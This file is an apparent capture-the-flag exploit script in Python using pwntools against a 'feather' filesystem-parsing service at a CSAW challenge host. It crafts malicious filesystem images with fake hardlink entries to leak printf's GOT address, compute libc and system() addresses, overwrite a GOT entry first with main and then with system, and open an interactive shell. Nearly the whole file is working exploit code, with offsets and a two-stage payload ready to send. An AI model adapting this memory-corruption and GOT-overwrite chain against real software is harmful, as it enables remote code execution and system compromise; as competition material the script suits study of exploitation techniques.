from dataclasses import dataclass
from typing import List
from base64 import b64encode
import struct

from pwn import remote, process, context, gdb

context.log_level = "debug"


# offsets & addresses:
# TODO: verify these against the final binary
# memcmp@got
#   memcmp is only called when caching symlink inodes
#   we'll aim this back at main
function_pointer_we_want_to_smash = 0x0041A050
# printf@got.plt
#   we'll leak this
function_pointer_we_want_to_leak = 0x0041A020
# addr of main
address_of_main = 0x404B0F
# printf@libc
#offset_of_printf = 0x64E80
#offset_of_printf = 0x64F00
offset_of_printf = 0x64E10
# system@libc
#offset_of_system = 0x4F440
#offset_of_system = 0x4F4E0
offset_of_system = 0x55410


p8 = lambda x: struct.pack("<B", x)
p32 = lambda x: struct.pack("<I", x)
p64 = lambda x: struct.pack("<Q", x)
u64 = lambda x: struct.unpack("<Q", x)[0]


class Type:
    Directory = 0
    File = 1
    File_Clone = 2
    Symlink = 3
    Hardlink = 4
    Label = 5


@dataclass
class Segment:
    type: int
    id: int
    offset: int
    length: int

    def serialize(self) -> bytearray:
        result = bytearray()
        result += p32(self.type)
        result += p32(self.id)
        result += p32(self.offset)
        result += p32(self.length)
        return result


class Feather:
    def __init__(self):
        self.segments: List[Segment] = []
        self.data: bytearray = bytearray()

    def serialize(self) -> bytearray:
        result = bytearray()

        result += b"FEATHER\0"  # magic
        result += p32(len(self.segments))  # num_segments

        for segment in self.segments:
            result += segment.serialize()

        result += self.data

        return result

    def add_segment(self, segment_type: int, data: bytes) -> int:
        node_id = len(self.segments)
        offset = len(self.data)
        if self.data.find(data) != -1:
            offset = self.data.find(data)
        else:
            self.data += data

        segment = Segment(segment_type, node_id, offset, len(data))
        self.segments.append(segment)

        return node_id

    def add_directory(self, name: bytes, child_ids: List[int]) -> int:
        packed_entries = b"".join(p32(child_id) for child_id in child_ids)
        data = p32(len(name)) + p32(len(child_ids)) + name + packed_entries
        return self.add_segment(Type.Directory, data)

    def add_file(self, name: bytes, contents: bytes) -> int:
        data = p32(len(name)) + p32(len(contents)) + name + contents
        return self.add_segment(Type.File, data)

    def add_symlink(self, name: bytes, target: bytes) -> int:
        data = p32(len(name)) + p32(len(target)) + name + target
        return self.add_segment(Type.Symlink, data)

    def add_hardlink(self, name: bytes, target: int) -> int:
        data = p32(len(name)) + p32(target) + name
        return self.add_segment(Type.Hardlink, data)

    def add_label(self, label: bytes) -> int:
        return self.add_segment(Type.Label, label)


def make_first_stage_fs():
    """
    make a feather fs for the first stage

    this is responsible for doing 2 things
    1) leaking a got address (strlen) in the name of one file on the filesystem
    2) smashing a got entry that gets called during shutdown with a pointer to main, giving us a chance for a stage 2
    """
    fs = Feather()

    main = fs.add_file(b"main", p64(address_of_main))

    # fake hardlink
    fake_entry1 = b""
    # +0x0  : fake_entry.type
    fake_entry1 += p32(Type.File_Clone)
    fake_entry1 += p32(0)  # pad
    # +0x8  : fake_entry.name
    # +0x8  :                .ptr
    # +0x10 :                .size
    # +0x18 :                .capacity / inline storage
    fake_entry1 += p64(function_pointer_we_want_to_leak)  # ptr
    fake_entry1 += p64(8)  # size
    fake_entry1 += p64(0x3333)  # capacity
    # +0x20 : padding
    fake_entry1 += p32(0)
    # +0x28 : fake_entry.value
    # +0x28 :                 .padding
    # +0x2c :                 .source_inode
    # +0x34 :                 .padding
    # +0x38 :                 .vector.base
    # +0x40 :                 .vector.end
    # +0x48 :                 .vector.end_of_alloc
    # +0x4c :                 .padding
    # +0x50 :                 .index
    fake_entry1 += p32(0x11111)  # padding
    fake_entry1 += p32(main)  # source_inode
    fake_entry1 += p32(0x333333)  # padding
    fake_entry1 += p64(function_pointer_we_want_to_smash)  # vector.base
    fake_entry1 += p64(function_pointer_we_want_to_smash)  # vector.end
    fake_entry1 += p64(function_pointer_we_want_to_smash + 8)  # vector.end_of_alloc
    fake_entry1 += p32(0x77777)  # padding
    fake_entry1 += p32(0x88888)  # padding
    fake_entry1 += p8(2)  # index

    fs.add_label(fake_entry1 + b"A" * 30)
    meme = fs.add_hardlink(b"meme", 1234567)
    intermediate = fs.add_directory(b"aaaaaaaaaaaaaaaaaaaaaaaaa", [])
    sym = fs.add_symlink(b"link", b"/aaaaaaaaaaaaaaaaaaaaaaaaa/")
    root = fs.add_directory(b"", [main, meme, intermediate, sym])

    return fs


def make_second_stage_fs(address_of_system: int):
    """
    make a feather fs for the second stage

    This smashes strlen with system
    """
    fs = Feather()

    system = fs.add_file(b"system", p64(address_of_system))

    # fake hardlink
    fake_entry1 = b""
    # +0x0  : fake_entry.type
    fake_entry1 += p32(Type.File_Clone)
    fake_entry1 += p32(0)  # pad
    # +0x8  : fake_entry.name
    # +0x8  :                .ptr
    # +0x10 :                .size
    # +0x18 :                .capacity / inline storage
    fake_entry1 += p64(function_pointer_we_want_to_leak)  # ptr
    fake_entry1 += p64(8)  # size
    fake_entry1 += p64(0x3333)  # capacity
    # +0x20 : padding
    fake_entry1 += p32(0)
    # +0x28 : fake_entry.value
    # +0x28 :                 .padding
    # +0x2c :                 .source_inode
    # +0x34 :                 .padding
    # +0x38 :                 .vector.base
    # +0x40 :                 .vector.end
    # +0x48 :                 .vector.end_of_alloc
    # +0x4c :                 .padding
    # +0x50 :                 .index
    fake_entry1 += p32(0x11111)  # padding
    fake_entry1 += p32(system)  # source_inode
    fake_entry1 += p32(0x333333)  # padding
    fake_entry1 += p64(function_pointer_we_want_to_smash)  # vector.base
    fake_entry1 += p64(function_pointer_we_want_to_smash)  # vector.end
    fake_entry1 += p64(function_pointer_we_want_to_smash + 8)  # vector.end_of_alloc
    fake_entry1 += p32(0x77777)  # padding
    fake_entry1 += p32(0x88888)  # padding
    fake_entry1 += p8(2)  # index

    fs.add_label(fake_entry1 + b"A" * 30)
    meme = fs.add_hardlink(b"meme", 1234567)
    intermediate = fs.add_directory(b"sh\0aaaaaaaaaaaaaaaaaaaaa", [])
    sym = fs.add_symlink(b"link", b"/sh\0aaaaaaaaaaaaaaaaaaaaa/")
    root = fs.add_directory(b"", [system, meme, intermediate, sym])

    return fs


def main():
    #r = remote("localhost", 8000)
    r = remote("pwn.chal.csaw.io", "5017")
    # r = process("./feather", env={"LD_PRELOAD": "./libc-2.27.so"})
    # gdb.attach(r, "")

    r.recvuntil(
        b"Please send a base64-encoded feather file, followed by two newlines:\n"
    )

    stage1 = make_first_stage_fs().serialize()
    r.sendline(str(b64encode(stage1), "ascii"))
    r.sendline()

    data = r.recvuntil(
        b"Please send a base64-encoded feather file, followed by two newlines:\n"
    )

    leak = u64(data.splitlines()[4][2:8].ljust(8, b"\0"))
    libc = leak - offset_of_printf
    system = libc + offset_of_system
    print(f"printf @ {leak:#x}, libc @ {libc:#x}, system @ {system:#x}")

    stage2 = make_second_stage_fs(system).serialize()
    r.sendline(str(b64encode(stage2), "ascii"))
    r.sendline()

    # type commands
    r.interactive()


if __name__ == "__main__":
    main()
